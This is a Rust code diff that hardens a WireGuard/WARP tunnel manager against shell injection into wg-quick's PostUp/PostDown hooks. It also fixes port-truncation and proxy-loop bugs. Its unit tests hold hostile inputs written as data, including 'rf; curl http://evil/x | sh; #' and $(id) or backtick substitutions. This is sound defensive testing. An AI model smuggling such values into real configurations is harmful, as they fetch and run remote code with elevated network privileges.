@@ -95,6 +95,35 @@ pub fn parse_profile(text: &str) -> WgProfile {
     p
 }
 
+/// Reject anything that is not a plain path/dir token.
+///
+/// `managed_conf` interpolates these into `PostUp = <script> up <iface>`, and
+/// wg-quick runs `PostUp`/`PostDown` through `sh -c`. A `scripts_dir` or
+/// `interface` containing `;`, `` ` ``, `$` or a space therefore becomes extra
+/// shell commands running as the service user — which holds CAP_NET_ADMIN. Not
+/// remotely reachable today (no API route writes these, and the wg-quick
+/// invocations use argv), but the value comes from config.json and the blast
+/// radius is root-adjacent, so it is worth refusing rather than trusting.
+fn shell_safe(s: &str) -> bool {
+    !s.is_empty()
+        && !s.contains(|c: char| {
+            c.is_whitespace()
+                || matches!(
+                    c,
+                    ';' | '&' | '|' | '`' | '$' | '(' | ')' | '<' | '>' | '"' | '\'' | '\\' | '*'
+                        | '?' | '[' | ']' | '{' | '}' | '!' | '#' | '~'
+                )
+        })
+}
+
+/// A Linux interface name: IFNAMSIZ is 16 including the NUL, so 1..=15 chars,
+/// which is exactly what wg-quick itself accepts.
+pub fn valid_iface(s: &str) -> bool {
+    !s.is_empty()
+        && s.len() <= 15
+        && s.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.'))
+}
+
 /// Build the config wg-quick actually runs: DNS removed (we resolve through
 /// the host), `Table = off` + our policy-routing hooks.
 fn managed_conf(
@@ -104,9 +133,25 @@ fn managed_conf(
     keepalive: u64,
     mtu: u64,
     table: u16,
-) -> String {
+) -> Result<String, String> {
+    if !valid_iface(iface) {
+        return Err(format!(
+            "warp.interface {iface:?} is not a valid interface name (allowed: A-Za-z0-9_.- , max 15 chars)"
+        ));
+    }
+    if !shell_safe(scripts_dir) {
+        return Err(format!(
+            "vpngate.scripts_dir {scripts_dir:?} contains characters that would be \
+             interpreted by the shell when wg-quick runs PostUp/PostDown"
+        ));
+    }
     let up = Path::new(scripts_dir).join("warp-up.sh");
     let down = Path::new(scripts_dir).join("warp-down.sh");
+    // Re-check after join(): a hostile `scripts_dir` could still have introduced
+    // something via the filename half, and these land in the same sh -c line.
+    if !shell_safe(&up.display().to_string()) || !shell_safe(&down.display().to_string()) {
+        return Err("resolved hook script path is not shell-safe".into());
+    }
     let ka = if keepalive > 0 {
         keepalive
     } else {
@@ -117,7 +162,7 @@ fn managed_conf(
     if ips.is_empty() {
         ips.push("172.16.0.2/32".into());
     }
-    format!(
+    Ok(format!(
         "[Interface]\nPrivateKey = {}\nAddress = {}\nMTU = {}\nTable = off\nEnvironment = WARP_TABLE={}\nPostUp = {} up {}\nPostDown = {} down {}\n\n[Peer]\nPublicKey = {}\nEndpoint = {}\nAllowedIPs = 0.0.0.0/0, ::/0\nPersistentKeepalive = {}\n",
         profile.private_key,
         ips.join(", "),
@@ -130,7 +175,7 @@ fn managed_conf(
         profile.public_key,
         if profile.endpoint.is_empty() { "engage.cloudflareclient.com:2408" } else { &profile.endpoint },
         ka.max(15),
-    )
+    ))
 }
 
 fn which(bin: &str) -> Option<PathBuf> {
@@ -328,7 +373,7 @@ pub async fn connect(state: &Arc<AppState>) -> Result<(), String> {
         cfg.warp.keepalive,
         cfg.warp.mtu,
         cfg.warp.local_port,
-    );
+    )?;
     write_secret(&managed, &conf).await?;
 
     // tear down a stale interface first
@@ -457,7 +502,7 @@ pub async fn clear_ports(state: &Arc<AppState>) {
     let mut tunnels = state.vpn_tunnels.write().await;
     tunnels.retain(|t| {
         !((t.server_key == "warp" && t.local_port == cfg.warp.local_port)
-            || (t.server_key == "masque" && t.local_port == cfg.warp.mihomo_port))
+            || (t.server_key == "masque" && t.local_port == cfg.warp.masque_port))
     });
 }
 
@@ -798,7 +843,13 @@ pub fn parse_clash(yaml: &str) -> Vec<ClashNode> {
             name: s(m, "name").unwrap_or_else(|| format!("{kind} node")),
             kind,
             server: s(m, "server").unwrap_or_default(),
-            port: num(m, "port").unwrap_or(0) as u16,
+            // `num` yields a u64 and also accepts the string form ("70000"), so an
+            // out-of-range port must be rejected rather than truncated: `as u16`
+            // silently turned 70000 into 4464, and that wrong value then flowed
+            // into mihomo's JSON and the UI with no error anywhere.
+            port: num(m, "port")
+                .and_then(|p| u16::try_from(p).ok())
+                .unwrap_or(0),
             private_key: priv_raw,
             public_key: pub_raw,
             wg_private_key,
@@ -924,7 +975,7 @@ pub fn supervisor(state: Arc<AppState>) {
                     Some(c) => matches!(c.try_wait(), Ok(None)),
                     None => false,
                 };
-                (alive, cfg.warp.mihomo_port)
+                (alive, cfg.warp.masque_port)
             };
             if tokio::fs::metadata(&cfg.warp.mihomo_conf)
                 .await
@@ -937,7 +988,7 @@ pub fn supervisor(state: Arc<AppState>) {
                         Err(e) => warn!(error = %e, "masque sidecar start failed"),
                     }
                 } else {
-                    ensure_proxy_listener(&state, cfg_port).await;
+                    ensure_proxy_listener(&state, cfg_port, cfg.warp.mihomo_port).await;
                     classify_masque(&state, cfg_port).await;
                 }
             }
@@ -975,8 +1026,8 @@ async fn start_masque(cfg: &crate::config::Config, state: Arc<AppState>) -> Resu
     *slot.lock().unwrap_or_else(|e| e.into_inner()) = Some(child);
     // give it a moment to bind before we dial
     tokio::time::sleep(Duration::from_secs(2)).await;
-    ensure_proxy_listener(&state, cfg.warp.mihomo_port).await;
-    classify_masque(&state, cfg.warp.mihomo_port).await;
+    ensure_proxy_listener(&state, cfg.warp.masque_port, cfg.warp.mihomo_port).await;
+    classify_masque(&state, cfg.warp.masque_port).await;
     Ok(())
 }
 
@@ -987,33 +1038,47 @@ static MASQUE_SLOT: std::sync::OnceLock<std::sync::Mutex<Option<tokio::process::
 /// The port is recorded only after the listener actually bound, so a bind
 /// failure (e.g. an orphaned mihomo still holding the port after a service
 /// restart) is retried on the next tick instead of being remembered forever.
-async fn ensure_proxy_listener(state: &Arc<AppState>, port: u16) {
+/// Idempotent fanout listener for a MASQUE tunnel.
+///
+/// `fanout_port` is what clients (and therefore 3x-ui) connect to;
+/// `upstream_port` is the mihomo sidecar's own `mixed-port` that we relay
+/// through. These are deliberately two separate parameters: the previous
+/// version took a single `port` and used it for both the bind *and* the
+/// `socks5://` dialer, which meant our listener's upstream was the listener
+/// itself — every client CONNECT re-entered `run_listener_inner` and dialed
+/// the same port again, spawning listener tasks and socket pairs until the fd
+/// table was exhausted.
+async fn ensure_proxy_listener(state: &Arc<AppState>, fanout_port: u16, upstream_port: u16) {
+    debug_assert_ne!(
+        fanout_port, upstream_port,
+        "masque fanout port must differ from the mihomo sidecar port"
+    );
     static PROXY_LISTENERS: std::sync::OnceLock<std::sync::Mutex<Vec<u16>>> =
         std::sync::OnceLock::new();
     let set = PROXY_LISTENERS.get_or_init(|| std::sync::Mutex::new(Vec::new()));
     if set
         .lock()
         .unwrap_or_else(|e| e.into_inner())
-        .contains(&port)
+        .contains(&fanout_port)
     {
         return;
     }
     let st = state.clone();
     let (tx, rx) = tokio::sync::oneshot::channel::<()>();
     tokio::spawn(async move {
-        let dialer = Dialer::Proxy(format!("socks5://127.0.0.1:{port}"));
-        if let Err(e) = relay::run_listener_signaled(st, port, dialer, tx).await {
-            warn!(port, error = %e, "masque fanout port bind failed (will retry)");
+        let dialer = Dialer::Proxy(format!("socks5://127.0.0.1:{upstream_port}"));
+        if let Err(e) = relay::run_listener_signaled(st, fanout_port, dialer, tx).await {
+            warn!(port = fanout_port, error = %e, "masque fanout port bind failed (will retry)");
         }
     });
     // resolves only after the bind succeeded (or the task died)
     match tokio::time::timeout(std::time::Duration::from_secs(5), rx).await {
         Ok(Ok(())) => {
-            set.lock().unwrap_or_else(|x| x.into_inner()).push(port);
-            info!(port, "masque fanout port listening");
+            set.lock().unwrap_or_else(|x| x.into_inner()).push(fanout_port);
+            info!(port = fanout_port, upstream = upstream_port, "masque fanout port listening");
         }
-        Ok(Err(_)) => warn!(port, "masque listener died before binding"),
-        Err(_) => warn!(port, "masque listener bind timed out"),
+        Ok(Err(_)) => warn!(port = fanout_port, "masque listener died before binding"),
+        Err(_) => warn!(port = fanout_port, "masque listener bind timed out"),
     }
 }
 
@@ -1073,6 +1138,54 @@ mod tests {
             normalize_key("5MNnY76OiMX+L6CzAcRlbxFUthDxisBwow45LL43PgM=").as_deref(),
             Some("5MNnY76OiMX+L6CzAcRlbxFUthDxisBwow45LL43PgM=")
         );
+    }
+
+    /// `managed_conf` interpolates these into a line wg-quick hands to `sh -c`.
+    #[test]
+    fn refuses_shell_unsafe_managed_conf_inputs() {
+        let p = WgProfile {
+            private_key: "k".into(),
+            public_key: "p".into(),
+            endpoint: "1.2.3.4:2408".into(),
+            addresses: vec!["172.16.0.2/32".into()],
+            allowed_ips: Vec::new(),
+            dns: Vec::new(),
+            keepalive: 0,
+            mtu: 0,
+        };
+        let ok = |iface: &str, dir: &str| managed_conf(&p, iface, dir, 0, 0, 22000);
+
+        // the normal configuration still works
+        assert!(ok("warp-rf", "/opt/resi-fanout/scripts").is_ok());
+
+        // a hostile interface name would otherwise append a command to PostUp
+        for bad in [
+            "rf; curl http://evil/x | sh; #",
+            "rf`id`",
+            "rf$(id)",
+            "rf id",
+            "rf\nid",
+            "",
+        ] {
+            assert!(ok(bad, "/opt/resi-fanout/scripts").is_err(), "accepted iface {bad:?}");
+        }
+        // IFNAMSIZ is 16 including the NUL
+        assert!(ok("warp-rf-0123456789", "/opt/resi-fanout/scripts").is_err());
+
+        // same for the hook path half
+        for bad in ["/opt/a;id", "/opt/a`id`", "/opt/a b", ""] {
+            assert!(ok("warp-rf", bad).is_err(), "accepted scripts_dir {bad:?}");
+        }
+    }
+
+    #[test]
+    fn valid_iface_accepts_what_wg_quick_accepts() {
+        for good in ["warp-rf", "wg0", "a", "A_b-1.2", "012345678901234"] {
+            assert!(valid_iface(good), "rejected {good:?}");
+        }
+        for bad in ["", "has space", "semi;colon", "0123456789012345"] {
+            assert!(!valid_iface(bad), "accepted {bad:?}");
+        }
     }
 
     /// A SEQUENCE holding a single OCTET STRING(32) is the plain-wireguard
